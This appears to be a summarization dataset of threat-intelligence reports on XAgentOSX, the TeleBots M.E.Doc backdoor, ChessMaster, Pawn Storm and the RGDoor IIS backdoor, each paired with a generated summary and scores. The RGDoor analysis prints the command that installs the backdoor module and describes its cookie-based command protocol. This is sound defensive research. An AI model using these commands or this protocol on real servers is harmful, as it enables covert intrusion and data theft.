iPad. We believe this command is used to determine if a mobile device was backed up, and we speculate that the actors would use other commands within XAgent to exfiltrate those files.Keylogging FunctionalityXAgent also has a keylogger functionality that allows the threat actors to steal credentials as the user types them. XAgent logs key strokes by calling the CGEventTapCreate function to set an event hook to call a callback function named _myCGEventTapCallBack when it detects pressed keys. This callback function will call a function named pressedKeyWithKeyCode, which is responsible for logging the keystrokes. The keylogger will monitor for active application windows and write them to the log in the following format:<span class='keylog_process'>[Application Name]</span>The keylogger will log a configurable amount of keystrokes (default 50) before sending the log to the C2 server using the following format:<span class='keylog_user_keys'>[logged keystrokes]</span>The keylogger can handle logging special keys, such as return and the function keys and will report those within the log in the following format,<span class='keylog_spec_key'>[special character]</span>InfrastructureThe XAgentOSX sample we analyzed was configured to use the following IP address and domain names as its C2 servers:23.227.196[.]215apple-iclods[.]orgapple-checker[.]orgapple-uptoday[.]orgapple-search[.]infoWhen we analyzed this sample, the domain names that were used as backup C2 locations were not registered, therefore, these domains did not provide any links to additional infrastructure. We were also unable to find any additional infrastructure based on the primary C2 location of 23.227.196[.]215. However, according to CrowdStrike, the nearby IP address 23.227.196[.]217 hosted the C2 location for an XTunnel payload used by the Sofacy group in the attack on the Democratic National Committee. While these IP addresses do not directly overlap, it does appear that the Sofacy group continues to use the same hosting services to host their infrastructure.ConclusionThe Sofacy group continues to bolster their toolset to carry out attack campaigns on multiple platforms. In this case, the threat group uses the same name XAgent for this macOS-based tool as one of their Windows-based tools. Also, the macOS variant of this tool uses a similar network communications method as its Windows counterpart, which suggests this group continues to use consolidated C2 services to control compromised hosts, as we saw during our comparison of the Komplex and Seduploader (formerly referred to as Sofacy Carberp) tools. Also, while we lack attack telemetry, we were able to find a loose connection to the attack campaign that Sofacy waged on the Democratic National Committee based on hosting data in both attacks.Palo Alto Networks customers are protected from XAgentOSX via:Known samples are detected as malicious by WildFireAll known C2 locations are marked as malicious in PANDBUsers can use AutoFocus tag XAgent to track this threatIndicators of CompromiseSHA2562a854997a44f4ba7e307d408ea2d9c1d84dde035c5dab830689aa45c5b5746eaCommand and Control23.227.196[.]215apple-iclods[.]orgapple-checker[.]orgapple-uptoday[.]orgapple-search[.]info";The Sofacy group continues to bolster their toolset to carry out attack campaigns on multiple platforms. In this case, the threat group uses the same name XAgent for this macOSbased tool as one of their Windowsbased tools. Also, the macOS variant of this tool uses a similar network communications method as its Windows counterpart, which suggests this group continues to use consolidated C2 services to control compromised hosts, as we saw during our comparison of the Komplex and Seduploader (formerly referred to as Sofacy Carberp) tools. Also, while we lack attack telemetry, we were able to find a loose connection to the attack campaign that Sofacy waged on the Democratic National Committee based on hosting data in both attacks.;en;{'r': 0.11554921540656206, 'p': 0.9759036144578314, 'f': 0.20663265116803547};{'r': 0.07779349363507779, 'p': 0.9565217391304348, 'f': 0.1438848906952184};{'r': 0.11554921540656206, 'p': 0.9759036144578314, 'f': 0.20663265116803547}
https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/;Analysis of TeleBots’ cunning backdoor;"This article reveals details about the initial infection vector that was used during the DiskCoder.C outbreak.On the 27th of June 2017, a new cyberattack hit many computer systems in Ukraine, as well as in other countries. That attack was spearheaded by the malware ESET products detect as Diskcoder.C (aka ExPetr, PetrWrap, Petya, or NotPetya). This malware masquerades as typical ransomware: it encrypts the data on the computer and demands $300 in bitcoins for recovery. In fact, the malware authors' intention was to cause damage, so they did all that they could to make data decryption very unlikely.In our previous blogpost, we attributed this attack to the TeleBots group and uncovered details about other similar supply chain attacks against Ukraine. This article reveals details about the initial distribution vector that was used during the DiskCoder.C outbreak.Tale of a malicious updateThe Cyberpolice Department of Ukraine's National Police stated, on its Facebook account, as did ESET and other information security companies, that the legitimate Ukrainian accounting software M.E.Doc was used by the attackers to push DiskCoder.C malware in the initial phase of the attack. However, until now, no details were provided as to exactly how it was accomplished.During our research, we identified a very stealthy and cunning backdoor that was injected by attackers into one of M.E.Doc's legitimate modules. It seems very unlikely that attackers could do this without access to M.E.Doc's source code.The backdoored module has the filename ZvitPublishedObjects.dll. This was written using the .NET Framework. It is a 5MB file and contains a lot of legitimate code that can be called by other components, including the main M.E.Doc executable ezvit.exe.We examined all M.E.Doc updates that were released during 2017, and found that there are at least three updates that contained the backdoored module:10.01.175-10.01.176, released on April 14th 201710.01.180-10.01.181, released on May 15th 201710.01.188-10.01.189, released on June 22nd 2017The incident with Win32/Filecoder.AESNI.C happened three days after the 10.01.180-10.01.181 update and the DiskCoder.C outbreak happened five days after the 10.01.188-10.01.189 update. Interestingly, four updates from April 24th 2017, through to May 10th 2017, and seven software updates from May 17th 2017, through to June 21st 2017, didn't contain the backdoored module.Since the May 15th update did contain the backdoored module and the May 17th update didn't, here is a hypothesis that could explain the low infection Win32/Filecoder.AESNI.C ratio: the release of the May 17th update was an unexpected event for the attackers. They pushed the ransomware on May 18th, but the majority of M.E.Doc users no longer had the backdoored module as they had updated already.The PE compilation stamps of analyzed files suggest that these files were compiled on the same date as the update or the day before.Figure 2 shows the differences between the list of classes of backdoored and non-backdoored versions of the ZvitPublishedObjects.dll module, using the ILSpy .NET Decompiler:The main backdoor class is named MeCom and it is located in the ZvitPublishedObjects.Server namespace as shown in Figure 3.The methods of the MeCom class are invoked by the IsNewUpdate method of UpdaterUtils in the ZvitPublishedObjects.Server namespace. The IsNewUpdate method is called periodically in order to check whether a new update is available. The backdoored module from May 15th is implemented in a slightly different way and has fewer features than the one from June 22nd.Each organization that does business in Ukraine has a unique legal entity identifier called the EDRPOU number (??? ??????). This is extremely important for the attackers: having the EDRPOU number, they could identify the exact organization that is now using the backdoored M.E.Doc. Once such an organization is identified, attackers could then use various tactics against the computer network of the organization, depending on the attackers' goal(s).Since M.E.Doc is accounting software commonly used in Ukraine, the EDRPOU values could be expected to be found in application data on machines using this software. Hence, the code that was injected in the IsNewUpdate method collects all EDRPOU values from application data: one M.E.Doc instance could be used to perform accounting operations for multiple organizations, so the backdoored code collects all possible EDRPOU numbers.Along with the EDRPOU numbers, the backdoor collects proxy and email settings, including usernames and passwords, from the M.E.Doc application.Warning! We recommend changing passwords for proxies, and for email accounts for all users of M.E.Doc software.The malicious code writes the information collected into the Windows registry under the HKEY_CURRENT_USER\SOFTWARE\WC key using Cred and Prx value names. So if these values exist on a computer, it is highly likely that the backdoored module did, in fact, run on that computer.And here is the most cunning part! The backdoored module does not use any external servers as C&Cs: it uses the M.E.Doc software's regular update check requests to the official M.E.Doc server upd.me-doc.com[.]ua. The only difference from a legitimate request is that the backdoored code sends the collected information in cookies.We have not performed forensic analysis on the M.E.Doc server. However, as we noted in our previous blogpost, there are signs that the server was compromised. So we can speculate that the attackers deployed server software that allows them to differentiate between requests from compromised and non-compromised machines.And, of course, the attackers added the ability to control the infected machine. The code receives a binary blob official M.E.Doc server, decrypts it using the Triple DES algorithm, and, afterwards, decompresses it using GZip. The result is an XML file that could contain several commands at once. This remote control feature makes the backdoor a fully-featured cyberespionage and cybersabotage platform at the same time.The following table shows possible commands:Command Purpose 0 - RunCmd Executes supplied shell command 1 - DumpData Decodes supplied Base64 data and saves it to a file 2 - MinInfo Collects information about OS version, bitness (32 or 64), current privileges, UAC settings, proxy settings, email settings including login and password 3 - GetFile Collects file from the infected computer 4 - Payload Decodes supplied Base64 data, saves it to an executable file 5 - AutoPayload Same as previous but the supplied file should be a DLL and it will be dropped and executed from the Windows folder using rundll32.exe. In addition, once executed, it attempts to overwrite that dropped DLL and delete it.It should be noted that command number 5, named by malware authors as AutoPayload, perfectly matches the way in which DiskCoder.C was initially executed on ""patient zero"" machines.ConclusionsAs our analysis shows, this is a thoroughly well-planned and well-executed operation. We assume that the attackers had access to the M.E.Doc application source code. They had time to learn the code and incorporate a very stealthy and cunning backdoor. The size of the full M.E.Doc installation is about 1.5GB, and we have no way at this time to verify that there are no other injected backdoors.There are still questions to answer. How long has this backdoor been in use? What commands and malware other than DiskCoder.C or Win32/Filecoder.AESNI.C have been pushed via this channel? What other software update supply chains might the gang behind this attack have already compromised but are yet to weaponize?Special thanks to my colleagues Frederic Vachon and Thomas Dupuy for their help in this research.Indicators of Compromise (IoC)ESET detection names:MSIL/TeleDoor.ALegitimate servers abused by malware authors:upd.me-doc.com[.]uaSHA-1 hashes:7B051E7E7A82F07873FA360958ACC6492E4385DD7F3B1C56C180369AE7891483675BEC61F3182F273567434E2E49358E8210674641A20B147E0BD23CSign up to receive an email update whenever a new article is published in our Ukraine Crisis - Digital Security Resource Center Submit";The DiskCoder.C outbreak was caused by a supply chain attack against Ukraine. The initial infection vector that was used during the DiskCoder.C outbreak was spearheaded by the malware ESET products detect as Diskcoder.C (aka ExPetr, PetrWrap, Petya, or NotPetya). This malware masquerades as typical ransomware: it encrypts the data on the computer and demands $300 in bitcoins for recovery. In fact, the malware authors' intention was to cause damage, so they did all that they could to make data decryption very unlikely. The backdoored module from May 15th is implemented in a slightly different way and has fewer features than the one from June 22nd. Each organization that does business in Ukraine has a unique legal entity identifier called the EDRPOU number (??? ??????). This is extremely important for the attackers: having the EDRPOU number, they could identify the exact organization that is now using the backdoored M.E.Doc. Once such an organization is identified, attackers could then use various tactics against the computer network of the organization, depending on the attackers' goal(s). Since M.E.Doc is accounting software commonly used in Ukraine, the EDRPOU values could be expected to be found in application data on machines using this software. Hence, the code that was injected in the IsNewUpdate method collects all EDRPOU numbers from application data on machines using this software. Warning! We recommend changing passwords for proxies, and for email accounts for all users of M.E.Doc software. The malicious code writes the information collected into the Windows registry under the HKEY_CURRENT_USER\SOFTWARE\WC key using Cred and Prx value names. So if;en;{'r': 0.296229802513465, 'p': 0.9939759036144579, 'f': 0.45643153173204476};{'r': 0.20934411500449238, 'p': 0.9471544715447154, 'f': 0.34289918761633265};{'r': 0.296229802513465, 'p': 0.9939759036144579, 'f': 0.45643153173204476}
https://www.trendmicro.com/en_us/research/17/g/chessmaster-cyber-espionage-campaign.html;ChessMaster Makes its Move: A Look into its Arsenal;"From gathering intelligence, using the right social engineering lures, and exploiting vulnerabilities to laterally moving within the network, targeted attacks have multifarious tools at their disposal. And like in a game of chess, they are the set pieces that make up their modus operandi.Take for instance the self-named ChessMaster, a campaign targeting Japanese academe, technology enterprises, media outfits, managed service providers, and government agencies. It employs various poisoned pawns in the form of malware-laden spear-phishing emails containing decoy documents. And beyond ChessMaster's endgame and pawns, we also found red flags that allude to its links to APT 10, also known as menuPass, POTASSIUM, Stone Panda, Red Apollo, and CVNX.ChessMaster's name is from pieces of chess/checkers/draughts we found in the resource section of the main backdoor they use against their targets: ChChes, which Trend Micro detects as BKDR_CHCHES.What makes the campaign unique is its arsenal of tools and techniques:Malicious shortcut (LNK) files and PowerShell . The LNK files execute Command Prompt that downloads a The LNK files execute Command Prompt that downloads a PowerShell script , which would either directly drop or reflectively load ChChes into the machine. The latter method makes ChChes a fileless malware.Self-extracting archive (SFX). An archive that drops an executable (EXE), a dynamic-link library (DLL), and a binary file (.BIN). Upon their extraction, malicious code is injected into the process of a legitimate file/application (DLL hijacking). ChessMaster takes it up a notch via An archive that drops an executable (EXE), a dynamic-link library (DLL), and a binary file (.BIN). Upon their extraction, malicious code is injected into the process of a legitimate file/application (DLL hijacking). ChessMaster takes it up a notch via load-time dynamic linking to trigger the malicious DLL's function.Runtime packers. Throughout its campaign, ChChes used three packers to obfuscate itself and avoid detection. The first had no encryption and a varied loader code. The second had a buggy (or anti-emulation) exclusive OR (XOR) encryption technique. The third added an AES algorithm on top of XOR encryption. Their compile dates overlap, which indicates ChChes' authors take cues and fine-tune their malware.Second-stage payloads. Additional malware are introduced to the infected system for persistence. These are actually variants of ChChes that use similar entry points but different and encrypted C&C communication.Hacking Tools. ChessMaster draws on legitimate email and browser password recovery and dumping tools they've misused and modified for their campaign. These can restore forgotten passwords, which are then dumped and retrieved. Lateral movement and further attacks can be worked out from here.TinyX. A version of A version of PlugX sans the plug-in functionality that allows it to adopt new capabilities. TinyX is bundled separately in spear-phishing emails.RedLeaves. A second-stage backdoor that himawari (Japanese for sunflower) emerged capable of evading YARA rules released during that time. A second-stage backdoor that operates like the open-source and fileless remote access Trojan (RAT) Trochilus , which is known for enabling lateral movement in the infected systems. RedLeaves adopted capabilities from PlugX. In April, a RedLeaves variant named(Japanese for sunflower) emerged capable of evading YARA rules released during that time.ChessMaster and APT 10 Plays the Same Cyberespionage GameAPT 10/menuPass is a cyberespionage group whose specific campaign, Operation Cloud Hopper, attacked the intermediaries of their targets of interest--managed service providers (MSPs). Its notoriety stems from their prolific use of multifarious information-stealing backdoors and vulnerability exploits, along with the tenacity of its subterfuges, from spear-phishing emails to attack and infection chains. It also abused legitimate or open-source remote administration tools to steal data.If that sounded familiar, it's because ChessMaster and APT 10 appear to be playing the same cyberespionage game. Here's a further illustration:Figure 1: Similarities in ChessMaster and APT 10's attack chainWe first saw ChChes set its sights on an organization that's long been a target of APT 10/menuPass. As we caught and delved into more ChChes samples in the wild, however, we also saw how they followed the same pattern--exclusive packers, mutual targets, overlapping C&C infrastructure.ChChes' packer, for instance, resembled the one used in menuPass' old PlugX samples. DNS records also showed that some of their command and control (C&C) servers and domains resolved to the same IP address, or resided in the same subnet. Are they operated by the same actors? Their commonalities make it appear so. It's also known to happen, BlackTech's cyberespionage campaigns are a case in point.Figure 2: Comparison of Emdivi and ChChesChessMaster's ChChes also resembles another backdoor, Emdivi, which first made waves in 2014. They have the same endgame. Both are second-stage payloads that use the system's Security Identifier (SID) as encryption key so they execute only in their target's machine. Their difference lies in complexity--ChChes hides part of the decryption key and payload in registry keys to make it harder to reverse engineer.But that's just one dot in several we've connected. In one instance, we detected PlugX and Emdivi on the same machine. This PlugX variant connected to an APT 10/menuPass-owned domain, but the packer is similar to that used by ChChes. While it's possible it was hit by two different campaigns, further analysis told a different story. Both were compiled on the same date, only several hours apart. We detected and acquired the samples the next day, which means both backdoors were delivered to the victim a day after they were compiled.Figure 3: Overview of the overlaps in ChessMaster and APT 10's campaignsTake 'Control of the Center'Ultimately attacks like ChessMaster's make pawns out of the systems, networks, devices and their users, all of which hold the organization's crown jewels. This is why enterprises need to be steps ahead of the game: prepare, respond, restore, and learn. Plan ahead--what techniques will attackers use? How can I defend against them? Don't just pull the plug--understand what happened to better assess and mitigate the damage. Fine-tune your response--what worked, what didn't, and what could've been done better?Defense in depth plays a crucial role especially for the IT/system administrators and information security professionals that watch over them. The network, endpoints, servers, mobile devices, and web/email gateways are the bishops, knights, and rooks that underpin the enterprise's crown jewels, which is why securing them is important. Reduce their attack surface. Keep the systems updated and regularly patched, and enforce the principle of least privilege. Employ behavior monitoring and application control. Deploy firewalls as well intrusion detection and prevention systems. Implement URL categorization, network segmentation, and data categorization.ChessMaster's gambit is spear-phishing, so it's especially important to filter and safeguard the email gateway. Additionally, foster a cybersecurity-aware workforce. Seemingly benign icons or decoy documents can still swindle the victim, for instance. More importantly, develop proactive incident response and remediation strategies--threat intelligence helps enterprises prepare and mitigate attacks. Like in chess, the more you understand your enemy's moves, the more successful you can be at thwarting them.The Indicators of Compromise (IoCs) related to ChessMaster's campaigns is in this appendix.This has been presented in the RSA Conference 2017 Asia Pacific & Japan as ""ChessMaster: A New Campaign Targeting Japan Using the New ChChes Backdoor"" on July 27, 2017, in Marina Bay Sands, Singapore. Updated on August 14, 2017, 11:50 PM to include IoCs related to ChessMaster.";ChessMaster is a sophisticated malware campaign targeting Japanese academe, technology enterprises, media outfits, managed service providers, and government agencies. It employs various poisoned pawns in the form of malwareladen spearphishing emails containing decoy documents. And beyond ChessMaster's endgame and pawns, we also found red flags that allude to its links to APT 10, also known as menuPass, POTASSIUM, Stone Panda, Red Apollo, and CVNX. ChessMaster's name is from pieces of chess/checkers/draughts we found in the resource section of the main backdoor they use against their targets: ChChes, which Trend Micro detects as BKDR_CHCHES. What makes the campaign unique is its arsenal of tools and techniques: Malicious shortcut (LNK) files and PowerShell . The LNK files execute Command Prompt that downloads a The LNK files execute Command Prompt that downloads a PowerShell script , which would either directly drop or reflectively load ChChes into the machine. The latter method makes ChChes a fileless malware. Selfextracting archive (SFX). An archive that drops an executable (EXE), a dynamiclink library (DLL), and a binary file (.BIN). Upon their extraction, malicious code is injected into the process of a legitimate file/application (DLL hijacking). ChessMaster takes it up a notch via loadtime dynamic linking to trigger the malicious DLL's function. Runtime packers. Throughout its campaign, ChChes used three packers to obfuscate itself and avoid detection. The first had no encryption and a varied loader code. The second had;en;{'r': 0.24036979969183359, 'p': 0.9512195121951219, 'f': 0.38376383441777157};{'r': 0.1880184331797235, 'p': 0.9272727272727272, 'f': 0.3126436753576724};{'r': 0.24036979969183359, 'p': 0.9512195121951219, 'f': 0.38376383441777157}
https://www.trendmicro.com/en_us/research/18/a/update-pawn-storm-new-targets-politically-motivated-campaigns.html;Pawn Storm Targets and Politically Motivated Campaigns;In the second half of 2017 Pawn Storm, an extremely active espionage actor group, didn't shy away from continuing their brazen attacks. Usually, the group's attacks are not isolated incidents, and we can often relate them to earlier attacks by carefully looking at both technical indicators and motives.Pawn Storm has been attacking political organizations in France, Germany, Montenegro, Turkey, Ukraine, and the United States since 2015. We saw attacks against political organizations again in the second half of 2017. These attacks don't show much technical innovation over time, but they are well prepared, persistent, and often hard to defend against. Pawn Storm has a large toolset full of social engineering tricks, malware and exploits, and therefore doesn't need much innovation apart from occasionally using their own zero-days and quickly abusing software vulnerabilities shortly after a security patch is released.In summer and fall of 2017, we observed Pawn Storm targeting several organizations with credential phishing and spear phishing attacks. Pawn Storm's modus operandi is quite consistent over the years, with some of their technical tricks being used repeatedly. For example, tabnabbing was used against Yahoo! users in August and September 2017 in US politically themed email. The method, which we first discussed in 2014, involves changing a browser tab to point to a phishing site after distracting the target.We can often closely relate current and old Pawn Storm campaigns using data that spans more than four years, possibly because the actors in the group follow a script when setting up an attack. This makes sense, as the sheer volume of their attacks requires careful administration, planning, and organization to succeed. The screenshots below show two typical credential phishing emails that targeted specific organizations in October and November 2017. One type of email is supposedly a message from the target's Microsoft Exchange server about an expired password. The other says there is a new file on the company's OneDrive system.Figure 1. A sample of a credential phishing email Pawn Storm sent in October and November 2017Figure 2. Second type of credential phishing email that was sent by Pawn Storm in November 2017. The logo of the target organization has been removed from the screenshot and the color was changed as not to reveal the source.While these emails might not seem to be advanced in nature, we've seen that credential loss is often the starting point of further attacks that include stealing sensitive data from email inboxes. We have worked with one of the targets, an NGO in the Netherlands targeted twice, in late October and early November 2017. We successfully prevented both attacks from causing any harm. In one case we were able to warn the target within two hours after a dedicated credential phishing site was set up. In an earlier attack, we were able to warn the organization 24 hours before the actual phishing emails were sent.Olympic Wintersports FederationsWe have seen several International Olympic Wintersport Federations, such as the European Ice Hockey Federation, the International Ski Federation, the International Biathlon Union, the International Bobsleigh and Skeleton Federation and the International Luge Federation, among the group's targets in the second half of 2017. This is noteworthy due to the timing correlation between several Russian Olympic players being banned for life in fall, 2017. In 2016, Pawn Storm had some success in compromising WADA (the World Anti-Doping Agency) and TAS-CAS (the Court of Arbitration for Sport). At that time, Pawn Storm sought active contact with mainstream media either directly or via proxies and had influence on what some of them published.Political targetsIn the week of the 2017 presidential elections in Iran, Pawn Storm set up a phishing site targeting chmail.ir webmail users. We were able to collect evidence that credential phishing emails were sent to chmail.ir users on May 18, 2017, just one day before the presidential elections in Iran. We have previously reported similar targeted activity against political organizations in France, Germany, Montenegro, Turkey, Ukraine, and the United States.Beginning in June 2017, phishing sites were set up mimicking the ADFS (Active Directory Federation Services) of the U.S. Senate. By looking at the digital fingerprints of these phishing sites and comparing them with a large data set that spans almost five years, we can uniquely relate them to a couple of Pawn Storm incidents in 2016 and 2017. The real ADFS server of the U.S. Senate is not reachable on the open internet, however phishing of users' credentials on an ADFS server that is behind a firewall still makes sense. In case an actor already has a foothold in an organization after compromising one user account, credential phishing could help him get closer to high profile users of interest.The future of politically motivated campaignsRogue political influence campaigns are not likely to go away in the near future. Political organizations have to be able to communicate openly with their voters, the press and the general public. This makes them vulnerable to hacking and spear phishing. On top of that, it's also relatively easy to influence public opinion via social media. Social media platforms continue to form a substantial part of users' online experience, and they let advertisers reach consumers with their message.This makes social media algorithms susceptible to abuse by various actors with bad intentions. Publishing stolen data together with spreading fake news and rumors on social media gives malicious actors powerful tools. While a successful influence campaign might seem relatively easy to do, it needs a lot of planning, persistence, and resources to be successful. Some of the basic tools and services, like ones used to spread fake news on social media, are already being offered as a service in the underground economy.As we have mentioned in our overview paper on Pawn Storm, other actors may also start their own campaigns that aim to influence politics and issues of interest domestically and abroad. Actors from developing countries will learn and probably adapt similar methods quickly in the near future. In 2016, we published a report on C Major, an espionage group that primarily targets the Indian military. By digging deeper into C Major's activities, we found that this actor group not only attacks the Indian military, but also has dedicated botnets for compromised targets in Iranian universities, Afghanistan, and Pakistan. Recently, we have witnessed C Major also showing some interest in compromising military and diplomatic targets in the West. It is only a matter of time before actors like C Major begin attempting to influence public opinion in foreign countries, as well.With the Olympics and several significant global elections taking place in 2018, we can be sure Pawn Storm's activities will continue. We at Trend Micro will keep monitoring their targeted activities, as well as activities of similar actors, as cyberpropaganda and digital extortion remain in use.Indicators of Compromise (IoCs):;Pawn Storm has been targeting political organizations in France, Germany, Montenegro, Turkey, Ukraine, and the United States since 2015. We saw attacks against political organizations again in the second half of 2017. These attacks don't show much technical innovation over time, but they are well prepared, persistent, and often hard to defend against. Pawn Storm has a large toolset full of social engineering tricks, malware and exploits, and therefore doesn't need much innovation apart from occasionally using their own zerodays and quickly abusing software vulnerabilities shortly after a security patch is released. In summer and fall of 2017, we observed Pawn Storm targeting several organizations with credential phishing and spear phishing attacks. Pawn Storm's modus operandi is quite consistent over the years, with some of their technical tricks being used repeatedly. For example, tabnabbing was used against Yahoo! users in August and September 2017 in US politically themed email. The method, which we first discussed in 2014, involves changing a browser tab to point to a phishing site after distracting the target. We can often closely relate current and old Pawn Storm campaigns using data that spans more than four years, possibly because the actors in the group follow a script when setting up an attack. This makes sense, as the sheer volume of their attacks requires careful administration, planning, and organization to succeed. The screenshots below show two typical credential phishing emails that targeted specific organizations in October and November 2017. One type of email is supposedly a message from the target's Microsoft Exchange server about an expired password. The other says there is a new file on the company's OneDrive system.;en;{'r': 0.34701492537313433, 'p': 0.9946524064171123, 'f': 0.5145228177418127};{'r': 0.2597793380140421, 'p': 0.9847908745247148, 'f': 0.4111111078078735};{'r': 0.34701492537313433, 'p': 0.9946524064171123, 'f': 0.5145228177418127}
https://unit42.paloaltonetworks.com/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/;OilRig uses RGDoor IIS Backdoor on Targets in the Middle East;"SummaryWhile investigating files uploaded to a TwoFace webshell, Unit 42 discovered actors installing an Internet Information Services (IIS) backdoor that we call RGDoor. Our data suggests that actors have deployed the RGDoor backdoor on webservers belonging to eight Middle Eastern government organizations, as well as one financial and one educational institution.We believe the actors deploy RGDoor as a secondary backdoor to regain access to a compromised webserver in the event a victim organization detects and removes the TwoFace shell. We do not have HTTP logs that show the actor interacting with RGDoor, so we do not know the activities the actors carry out using the backdoor. However, we were able to create a client application to interact with RGDoor for testing purposes, which allowed us to interact with the backdoor to see how it operates on an IIS server.RGDoorUnlike TwoFace, the actors did not develop RGDoor in C to be interacted with at specific URLs hosted by the targeted IIS web server. Instead, the developer created RGDoor using C++, which results in a compiled dynamic link library (DLL). The DLL has an exported function named ""RegisterModule"", which is important as it led us to believe that this DLL was used as a custom native-code HTTP module that the threat actor would load into IIS. Starting with IIS 7, developers could create modules in C++ that the IIS webserver would load to extend IIS' capabilities, such as carry out custom actions on requests. The fact that RGDoor is an IIS HTTP module suggests that there is no visual representation of the shell for actors to interact with, which also differs from TwoFace's interface that actors can interact with by visiting the URL to the TwoFace ASPX file.According to Microsoft's documentation, native-code modules can be installed either in the IIS Manager GUI or via the command-line using the ""appcmd"" application. While we do not have logs to determine exactly how the actors install RGDoor, the actor can use the TwoFace webshell to install the RGDoor module via the command line. The following command could be used to install the HTTP module on an IIS server:%systemroot%\system32\inetsrv\APPCMD.EXE install module /name:[module name] /image:[path to RGDoor DLL] /add:trueWe confirmed the command above successfully installed the RGDoor backdoor in our test environment. Figure 1 shows the specific command we used to install RGDoor on our IIS server.Figure 1 Command-line used to install RGDoor module into IISWe confirmed RGDoor installed correctly into IIS by checking the HTTP Modules display in IIS Manager. Figure 2 shows the RGDoor DLL (HTTPParser.dll) was loaded into IIS using the module name HTTPParser.Figure 2 Installed RGDoor module displayed in the HTTP Modules list in IIS MangerListening for CommandsWe analyzed RGDoor samples and found that the ""RegisterModule"" function does very little other than calling the IHttpModuleRegistrationInfo::SetRequestNotifications method. According to MSDN, the SetRequestNotifications function has the following prototype, which allows a developer to configure the module to handle GET requests (dwRequestNotifications) and/or POST requests (dwPostRequestNotifications):SetRequestNotifications(IN IHttpModuleFactory * pModuleFactory,IN DWORD dwRequestNotifications,IN DWORD dwPostRequestNotifications)In RGDoor, the code calls this function with arguments that ignore inbound HTTP GET requests, but act on all HTTP POST requests seen by the IIS server, even POST requests issued over HTTPS. RGDoor calls this function with the following arguments, the third of which (dwPostRequestNotifications) is set to ""RQ_BEGIN_REQUEST"", which is an event triggered immediately after IIS receives the POST request:SetRequestNotifications(pModuleFactory,0,RQ_BEGIN_REQUEST)RGDoor is notified immediately when the IIS server receives an inbound HTTP POST request. RGDoor parses these POST requests, specifically looking for the HTTP ""Cookie"" field by accessing the HTTP header with the following function call:pHttpContext->GetRequest()->GetHeader(""Cookie"",NULL)After accessing the cookie field, RGDoor parses this field by looking for the string ""RGSESSIONID="", which is the basis for the name RGDoor. If present, the code uses the two-bytes immediately following the ""RGSESSIONID="" string as a decryption key, specifically treating the two character bytes as a single hexadecimal byte. For instance, the two-byte key of ""00"" would represent the hexadecimal value of 0x00, where ""FF"" would represent 0xff, and so on. The key is followed by a Base64 encoded string that contains ciphertext. The following represents the structure of the cookie filed in inbound RGDoor requests:RGSESSIONID=[two-bytes for key][Base64 encoded ciphertext]RGDoor decodes the Base64 encoded string and then decrypts the decoded string using a custom algorithm. The custom algorithm iterates through the ciphertext using the 'pxor' instruction to XOR each byte of ciphertext with the single-byte hexadecimal value from the two-byte character key provided in the cookie field.The code will parse the cleartext looking for one of three commands: ""cmd$"", ""upload$"" and ""download$"". The code treats the string immediately following the command as the command's argument. Table 1 provides the arguments and further details on the three commands.Command Description cmd$[command to execute] Uses ""popen"" to run the specified command. It enters a loop that calls ""fgets"" to get the command results. The loop finishes when a call to ""feof"" designates the end of the command results, which are relayed back to the actor via the HTTP response. upload$[path to file] Gets the length of uploaded data by checking the ""Content-Length"" field within the HTTP request. Uses the IHttpRequest::GetRemainingEntityBytes and IHttpRequest::ReadEntityBody methods to obtain base64 encoded data within the body of the HTTP POST request. The code decrypts the decoded data using the XOR algorithm and writes the data to the specified file. It will respond to this request with either ""write done \r"" or ""can't open file: "". download$[path to file] Reads a specified file and encrypts it with the XOR algorithm, Base64 encodes the ciphertext and sends the data back to the actor via the HTTP response.Table 1 Commands available within RGDoorResponding to CommandsWhen responding to inbound requests, the code will clear the response that IIS would have responded to the HTTP POST request by calling the following functions:pHttpContext->GetResponse()->Clear()RGDoor then constructs its own HTTP response by first setting the ""Content-Type"" field within the HTTP header to ""text/plain"". Figure 3 shows the code that uses the IHttpResponse::SetHeader method to set the ""Content-Type"" field within the HTTP response to ""text/plain"", specifically by using a value of 0xC (0xA + 2) for the ulHeaderIndex within HTTP_HEADER_ID enumeration.Figure 3 RGDoor code to set the HTTP Content-Type to ""text/plain""The sample then transmits the data back to the actor by creating a loop that calls the IHttpResponse::WriteEntityChunk method until all of the data is sent to the actor within HTTP responses. If the WriteEntityChunk method fails at any point during this loop, the code will respond to the actor with a HTTP 500 ""Server Error"" response by using the IHttpResponse::SetStatus method.Interacting with RGDoorWe created a client application to interact with the RGDoor module, specifically to issue commands to the backdoor and to see how it operates on the IIS server. As mentioned previously in this blog, RGDoor has three available commands, specifically ""cmd$"", ""upload$"" and ""download$"". We used our client to issue one of each of these commands.Figure 4 shows the HTTP request and response to our first interaction with the RGDoor module. The command issued in this request was ""cmd$whoami"", which instructs RGDoor to run the 'whoami' command in command prompt. The key used to encrypt this command was ""54"" (0x54), which resulted in Base64 encoded string of ""NzkwcCM8OzU5PQ=="". The HTTP response shows the RGDoor module returned the Base64 encoded string of ""PT0ndDUkJCQ7OzgIMDEyNSE4IDUkJCQ7OzheVA=="", which when decrypted using the same ""54"" key is the result of the 'whoami' command, specifically the string ""iis apppool\\defaultapppool\x00"".Figure 4 Issuing 'whoami' command and RGDoor's responseFigure 5 shows our testing of RGDoor's upload command, specifically ""upload$c:\windows\temp\test.txt"" that uploads a file from our local system to the webserver. The inbound request uses a key of ""54"" (0x54) that results in an encoded command string of ""ISQ4OzUwcDduCCM9OjA7IycIIDE5JAggMScgeiAsIA="". The request also includes the string ""IDEnID06M2VmZ14="" within the POST data, which is the string ""testing123"" from the file on our local system encrypted using the ""54"" key that will be written to the ""test.txt"" file on the server. As you can see from the HTTP response, RGDoor responded to this command with ""write done"", which is interesting as the response was in cleartext and not encrypted using the custom algorithm.Figure 5 Uploading a file to server via RGDoor Downloading a file from the server via RGDoorFigure 6 shows our testing of the download command within RGDoor, specifically a command ""download$c:\windows\temp\test.txt"" that downloads the file uploaded in our previous test. We chose to use the key ""89"" (0x89) in this test to showcase RGDoor's ability to use any hexadecimal byte as a key, which resulted in an encoded command string of ""7eb+5+Xm6O2t6rPV/uDn7eb++tX97OT51f3s+v2n/fH9"". RGDoor responds to this command with the encoded string ""/ez6/eDn7ri7uoM="", which when decrypted with the ""89"" key results in the string 'testing123', which is the contents of the ""test.txt"" file.Figure 6 Downloading a file from the server via RGDoorTo determine how the RGDoor client requests appears within the IIS request logs, we checked the logs of our default IIS installation in our test environment. By default, IIS does not log the values within Cookie fields 